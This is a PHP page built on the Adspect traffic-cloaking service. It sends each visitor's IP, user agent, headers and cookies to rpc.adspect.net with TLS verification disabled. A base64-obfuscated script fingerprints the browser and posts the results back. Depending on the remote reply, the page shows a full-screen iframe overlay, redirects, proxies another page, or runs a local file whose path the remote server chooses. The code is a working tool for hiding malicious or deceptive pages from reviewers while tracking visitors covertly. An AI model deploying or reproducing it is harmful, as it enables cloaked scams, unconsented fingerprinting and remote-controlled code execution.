<?php
 define('ADSPECT_DEBUG', 0); if (ADSPECT_DEBUG) { ini_set('display_errors', '1'); error_reporting(E_ALL); } else { ini_set('display_errors', '0'); } if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect_headers() { $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect($sid, $mode) { $ajax = $mode === 'ajax'; $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR' )); $ipaddr = strtok($ipaddr, ','); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-JS: ' . intval($ajax), 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); if ($errno = curl_errno($curl)) { if (ADSPECT_DEBUG) { die('cURL error: ' . curl_strerror($errno)); } header("{$proto} 500 Internal Server Error", true, 500); die; } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: text/html'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if ($ajax) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] === 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; if (adspect_coalesce($target, 'path') === '') { return null; } $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($mode === 'redirect' || !preg_match('/^https?:/i', $target)) { header("Location: {$target}"); } elseif ($mode === 'proxy') { $curl = curl_init(); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, $ua); curl_setopt($curl, CURLOPT_URL, $target); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $html = curl_exec($curl); curl_close($curl); $target = parse_url($target); $origin = $target['scheme'] . '://' . $target['host']; if (array_key_exists('port', $target)) { $origin .= ':' . $target['port']; } $dirurl = $origin . adspect_coalesce($target, 'path', '/'); $html = preg_replace('@(href|src)=(["\'])/(?!/)((?:(?!\2).)*)@i', "$1=$2{$origin}/$3", $html); $html = preg_replace('@(href|src)=(["\'])(?!(?:https?:)?//)((?:(?!\2).)*)@i', "$1=$2{$dirurl}/$3", $html); $html = preg_replace('@(href|src)=/(?!/)([^ ]*)@i', "$1={$origin}/$2", $html); $html = preg_replace('@(href|src)=(?!["\'])(?!(?:https?:)?//)([^ ]*)@i', "$1={$dirurl}/$2", $html); echo $html; } elseif ($mode === 'iframe') { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: if (ADSPECT_DEBUG) { die("cURL returned status code {$status}"); } header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 60); return $target; } } $target = adspect('1eb54a3c-c979-61a2-8e12-ac1f6b95a853', 'iframe'); if ($target === null) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,KGZ1bmN0aW9uKCl7ZnVuY3Rpb24gbCgpe2IuZXJyb3JzPWQ7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZm9ybSIpLGM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTthLm1ldGhvZD0iUE9TVCI7YS5hY3Rpb249d2luZG93LmxvY2F0aW9uLmhyZWY7Yy50eXBlPSJoaWRkZW4iO2MubmFtZT0iZGF0YSI7Yy52YWx1ZT1KU09OLnN0cmluZ2lmeShiKTthLmFwcGVuZENoaWxkKGMpO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YS5zdWJtaXQoKX12YXIgZD1bXSxiPXt9O3RyeXt2YXIgZT1mdW5jdGlvbihhKXtpZigib2JqZWN0Ij09PXR5cGVvZiBhJiZudWxsIT09YSl7dmFyIGM9ZnVuY3Rpb24oayl7dHJ5e3ZhciBoPWFba107c3dpdGNoKHR5cGVvZiBoKXtjYXNlICJvYmplY3QiOmlmKG51bGw9PT1oKWJyZWFrO2Nhc2UgImZ1bmN0aW9uIjpoPWgudG9TdHJpbmcoKX1mW2tdPWh9Y2F0Y2gocil7ZC5wdXNoKHIubWVzc2FnZSl9fSxmPXt9LGc7Zm9yKGcgaW4gYSljKGcpOwp0cnl7dmFyIG09T2JqZWN0LmdldE93blByb3BlcnR5TmFtZXMoYSk7Zm9yKGc9MDtnPG0ubGVuZ3RoOysrZyljKG1bZ10pO2ZbIiEhIl09bX1jYXRjaChrKXtkLnB1c2goay5tZXNzYWdlKX1yZXR1cm4gZn19O2Iud2luZG93PWUod2luZG93KTtiLmNvbnNvbGU9ZSh3aW5kb3cuY29uc29sZSk7Yi5zY3JlZW49ZSh3aW5kb3cuc2NyZWVuKTtiLmRvY3VtZW50PWUoZG9jdW1lbnQpO2IuZG9jdW1lbnRFbGVtZW50PWZ1bmN0aW9uKGEpe3RyeXt2YXIgYz17fTthPWEuYXR0cmlidXRlcztmb3IodmFyIGYgaW4gYSlmPWFbZl0sY1tmLm5vZGVOYW1lXT1mLm5vZGVWYWx1ZTtyZXR1cm4gY31jYXRjaChnKXtkLnB1c2goZy5tZXNzYWdlKX19KGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCk7Yi5uYXZpZ2F0b3I9ZSh3aW5kb3cubmF2aWdhdG9yKTtiLndlYmFzc2VtYmx5PWUod2luZG93LldlYkFzc2VtYmx5KTt0cnl7Yi50aW1lem9uZU9mZnNldD0obmV3IERhdGUpLmdldFRpbWV6b25lT2Zmc2V0KCl9Y2F0Y2goYSl7ZC5wdXNoKGEubWVzc2FnZSl9dHJ5e2U9CmZ1bmN0aW9uKCl7fTt2YXIgcD0wO2UudG9TdHJpbmc9ZnVuY3Rpb24oKXsrK3A7cmV0dXJuIiJ9O2NvbnNvbGUubG9nKGUpO2IudG9zdHJpbmc9cH1jYXRjaChhKXtkLnB1c2goYS5tZXNzYWdlKX10cnl7Yi50b3VjaEV2ZW50PWRvY3VtZW50LmNyZWF0ZUV2ZW50KCJUb3VjaEV2ZW50IikudG9TdHJpbmcoKX1jYXRjaChhKXtkLnB1c2goYS5tZXNzYWdlKX10cnl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIikuZ2V0Q29udGV4dCgid2ViZ2wiKSxxPW4uZ2V0RXh0ZW5zaW9uKCJXRUJHTF9kZWJ1Z19yZW5kZXJlcl9pbmZvIik7Yi53ZWJnbD17dmVuZG9yOm4uZ2V0UGFyYW1ldGVyKHEuVU5NQVNLRURfVkVORE9SX1dFQkdMKSxyZW5kZXJlcjpuLmdldFBhcmFtZXRlcihxLlVOTUFTS0VEX1JFTkRFUkVSX1dFQkdMKX19Y2F0Y2goYSl7ZC5wdXNoKGEubWVzc2FnZSl9d2luZG93Lm5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7bmFtZToibm90aWZpY2F0aW9ucyJ9KS50aGVuKGZ1bmN0aW9uKGEpe2IucGVybWlzc2lvbnM9Clt3aW5kb3cuTm90aWZpY2F0aW9uLnBlcm1pc3Npb24sYS5zdGF0ZV07bCgpfSxsKX1jYXRjaChhKXtkLnB1c2goYS5tZXNzYWdlKSxsKCl9fSkoKTsK"></script>
</body>
</html>
<?php die;